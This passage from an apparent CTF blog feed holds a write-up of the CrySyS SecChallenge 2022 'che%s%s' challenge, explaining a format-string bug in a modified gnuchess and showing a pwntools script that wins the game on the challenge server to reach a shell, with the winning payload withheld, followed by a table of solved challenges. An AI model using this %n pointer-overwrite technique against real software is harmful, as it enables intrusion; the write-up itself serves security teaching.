+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-basic-information">0x1 basic information</h3>
+
+<p>Just based on the title of the challenge, one can assume, that we are looking at a format string vulnerability.</p>
+
+<p>Since we are given the source code of the challenge, we can quickly identify, that it is a modified version of <code class="language-plaintext highlighter-rouge">gnuchess-6.2.9</code>. Pulling the original source, and diffing it to the “leaked” source, we can see, that the following parts were modified:</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">main.cc</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="o">*</span><span class="n">solved</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">solved</span> <span class="o">==</span> <span class="mh">0xb055</span><span class="p">){</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>and in <code class="language-plaintext highlighter-rouge">frontend/engine.cc</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">engineinput</span><span class="p">,</span> <span class="s">"1-0 {White mates}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Congrats! Here is your reward:"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>What we are looking at here, is an arbitrary memory write using <code class="language-plaintext highlighter-rouge">printf</code>.
+In a nutshell, format strings work in the following way:</p>
+
+<p>If you supply format characters in the format string part of the function call, the function will expect, that you have placed the variables on the stack according to the format characters. What if not? You are leaking the stack of your program.</p>
+
+<p>But how can we write data? This is where the <code class="language-plaintext highlighter-rouge">%n</code> format character comes into play. If you look up the manpage of <code class="language-plaintext highlighter-rouge">printf</code> for example, it says:</p>
+
+<blockquote>
+  <p>The  number  of  characters written so far is stored into the integer pointed to by the corresponding argument.  That argument shall be an int *, or variant whose size matches  the  (optionally)  supplied  integer length modifier.  No argument is converted.  (This specifier is not supported by the bionic C library.)   The  behavior is  undefined if the conversion specification includes any flags, a field width, or a precision.</p>
+</blockquote>
+
+<p>And luckily for us, the <code class="language-plaintext highlighter-rouge">solved</code> variable is an <code class="language-plaintext highlighter-rouge">int *</code>, so we have everything in order to exploit the code, and get a shell.</p>
+
+<h3 id="0x2-exploit">0x2 exploit</h3>
+
+<p>Since we are playing a proper chess engine, even when setting the <code class="language-plaintext highlighter-rouge">depth</code> of the engine to <code class="language-plaintext highlighter-rouge">1</code> gives us a tough opponent. So obviously we just get another, preferably better, engine to play for us. For this I chose <a href="https://stockfishchess.org/">stockfish</a>, which is a well-known engine, and after a bit of googling I set it up using <a href="https://pypi.org/project/PyChess/">pychess</a>.</p>
+
+<p>Implementing basic I/O communication as usual, and we have a stable way of getting to the part, where we can exploit the format string.</p>
+
+<p>The creators of the challenge were kind enough to put the <code class="language-plaintext highlighter-rouge">solved</code> variable onto the stack. We only had to figure out, where exactly it is.
+This is the part where <code class="language-plaintext highlighter-rouge">GDB</code> came in handy. Breaking at the <code class="language-plaintext highlighter-rouge">printf</code> call, we can examine the stack. 
+Looking at the trace, we can see that we are one function call deep from main, namely inside <code class="language-plaintext highlighter-rouge">NextEngineCmd()</code>.  Disassemblying it, we can see, that it actually allocates quite a huge stackframe:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x000055555556a8d1 &lt;+4&gt;:    push   rbp
+   0x000055555556a8d2 &lt;+5&gt;:    mov    rbp,rsp
+   0x000055555556a8d5 &lt;+8&gt;:    sub    rsp,0x1000
+</code></pre></div></div>
+<p>This means, that the solved variable will be quite far from us. To find its exact location we can break at the line in <code class="language-plaintext highlighter-rouge">main</code> where the variable gets compared:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x000055555555984d &lt;+2780&gt;:    mov    rax,QWORD PTR [rbp-0x1d8]
+   0x0000555555559854 &lt;+2787&gt;:    mov    eax,DWORD PTR [rax]
+   0x0000555555559856 &lt;+2789&gt;:    cmp    eax,0xb055
+   0x000055555555985b &lt;+2794&gt;:    jne    0x555555559873 &lt;main+2818&gt;
+   0x000055555555985d &lt;+2796&gt;:    lea    rdi,[rip+0x4395d]        # 0x55555559d1c1
+   0x0000555555559864 &lt;+2803&gt;:    call   0x555555558810 &lt;system@plt&gt;
+</code></pre></div></div>
+<p>From here, we can use the <code class="language-plaintext highlighter-rouge">x/Ngx $rsp</code> syntax, where <code class="language-plaintext highlighter-rouge">N</code> is a positive integer in order to find the pointer of <code class="language-plaintext highlighter-rouge">solved</code>. (You are looking for a heap address on the stack).</p>
+
+<p>If you found the <code class="language-plaintext highlighter-rouge">N</code>, you know where your your variable is, which you have to overwrite. Since it will be quite far, and your format string is limited to ~50 characters, you will have to use another trick, to directly access any “argument” of the stack (Look into the <code class="language-plaintext highlighter-rouge">%N$p</code> syntax). Since the call to <code class="language-plaintext highlighter-rouge">printf</code> will also allocate some memory on the stack, you will have to find the exact position using the format string vuln, and dumping the memory around the offset using the aforementioned syntax, until you find the exact position.</p>
+
+<p>The script I wrote to solve this challenge automates everything except finding the offset, but to not give the students an instant solution I will remove the winning format string from my code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">chess</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">chess.engine</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># exit gracefully on Ctrl + C
+</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+	<span class="n">engine</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
+	<span class="nb">exit</span><span class="p">()</span>
+
+<span class="c1"># register signal handler
+</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+<span class="n">pr</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"White winning"</span><span class="p">)</span>
+
+<span class="c1"># set up board and stockfish
+</span><span class="n">engine</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">SimpleEngine</span><span class="p">.</span><span class="n">popen_uci</span><span class="p">(</span><span class="s">"/usr/games/stockfish"</span><span class="p">)</span>
+<span class="n">limit</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">Limit</span><span class="p">(</span><span class="n">depth</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">board</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">Board</span><span class="p">()</span>
+
+<span class="c1">#with process(["gdb", "./chess"]) as p:
+</span>	<span class="c1">#p.sendline(b'b *NextEngineCmd+931')
+</span>	<span class="c1">#p.sendline(b'r')
+</span><span class="k">with</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chess.secchallenge.crysys.hu"</span><span class="p">,</span> <span class="mi">5017</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
+	<span class="c1"># initial setup, nerfing the chall
+</span>	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+	<span class="n">success</span><span class="p">(</span><span class="s">"Nerfed challenge to oblivion"</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"depth 1"</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">WIN</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+	<span class="n">movecount</span> <span class="o">=</span> <span class="mi">1</span>
+
+	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+
+		<span class="c1"># get the next engine move
+</span>		<span class="n">engine_ret</span> <span class="o">=</span> <span class="n">engine</span><span class="p">.</span><span class="n">play</span><span class="p">(</span><span class="n">board</span><span class="p">,</span> <span class="n">limit</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">Info</span><span class="p">.</span><span class="n">SCORE</span><span class="p">)</span>
+		<span class="n">pr</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="s">'score'</span><span class="p">].</span><span class="n">white</span><span class="p">()))</span>
+
+		<span class="c1"># send engine move to the challenge
+</span>		<span class="n">san_move</span> <span class="o">=</span> <span class="n">board</span><span class="p">.</span><span class="n">san</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">move</span><span class="p">)</span>
+
+		<span class="c1"># if we checkmate, go interactive
+</span>		<span class="k">if</span> <span class="s">"#"</span> <span class="ow">in</span> <span class="n">san_move</span><span class="p">:</span>
+			<span class="c1">#print(f"Winning move: {san_move}")
+</span>			<span class="c1">#p.interactive()
+</span>			<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">san_move</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+			<span class="n">pr</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"White checkmates"</span><span class="p">)</span>
+			<span class="n">rec</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'White (</span><span class="si">{</span><span class="n">movecount</span><span class="si">}</span><span class="s">) : '</span>
+			<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">rec</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+			<span class="n">success</span><span class="p">(</span><span class="s">"Enjoy your shell"</span><span class="p">)</span>
+			<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+		<span class="c1"># if not checkmate, let it play it out
+</span>		<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">san_move</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+		<span class="c1"># update local board
+</span>		<span class="n">board</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">move</span><span class="p">)</span>
+
+		<span class="n">movecount</span> <span class="o">+=</span> <span class="mi">1</span>
+
+		<span class="c1"># wait for the next prompt
+</span>		<span class="n">rec</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'White (</span><span class="si">{</span><span class="n">movecount</span><span class="si">}</span><span class="s">) : '</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">rec</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+		<span class="n">parsed_move</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'My move is : .*\n'</span><span class="p">,</span> <span class="n">answer</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+		<span class="c1"># push the move received to the board
+</span>		<span class="n">board</span><span class="p">.</span><span class="n">push_san</span><span class="p">(</span><span class="n">parsed_move</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="pwn" /><category term="secchallenge22" /><summary type="html"><![CDATA[Who doesn\'t love a good game a chess?]]></summary></entry><entry><title type="html">CrySyS Security Challenge 2022</title><link href="https://m4rcix.github.io/sc22" rel="alternate" type="text/html" title="CrySyS Security Challenge 2022" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/secchall22</id><content type="html" xml:base="https://m4rcix.github.io/sc22"><![CDATA[<p> </p>
+
+<p>This blogpost contains my writeups for the CrySyS Security Challenge 2022!</p>
+
+<p>Flags are <code class="language-plaintext highlighter-rouge">HIDDEN</code> until the end of the semester due to University reasons.</p>
+
+<p>The tables below contain my solution for some of the challenges. I did not managed to solve a lot, especially from the Crypto category, but since I suck at crypto, this was expected. The Solved column indicates the challenges I managed to solve during the competition.</p>
+
+<h2 id="crypto">Crypto</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">GRANNYGMA</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Encrypted Display Control</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Democracy</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">VPScoin</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">White box</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="pwn">Pwn</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/pwn/chess">che%s%s</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">heap-quest</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">pawned</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Black box</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">FORCEDFLAG</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="reverse">Reverse</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/reverse/layers">Layers</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/reverse/falleen_system">falleen system</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Advent of web3</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Exceptional</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Dimensions</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="web">Web</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/instant">Instant Development Company</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/snek">Snek</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/waffles">Waffles</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/web/notekeeper">Note Keeper</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">CoreQuest</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="hardware">Hardware</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/hardware/flagshift">Flagshift</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/hardware/broken">Broken</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Suspicious van</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Martian Quest: The Terraform</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Drive to checkered flag</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="misc">Misc</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Challenge</th>
+      <th style="text-align: center">Solved</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/office">Office Hazard</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/dangerous_volcano">Dangerous Volcano</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/goat">G.O.A.T. 🐐</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">refl🤣gger</td>
+      <td style="text-align: center">❌</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="/sc22/misc/piecemaker">piecemaker</a></td>
+      <td style="text-align: center">✅</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name>m4rcix</name></author><category term="secchallenge" /><category term="crysys" /><category term="CTF" /><category term="pwn" /><category term="crypto" /><category term="web" /><category term="hardware" /><category term="misc" /><category term="reverse" /><summary type="html"><![CDATA[Yearly fun organized by CrySyS Student Core and c0r3dump!]]></summary></entry></feed>
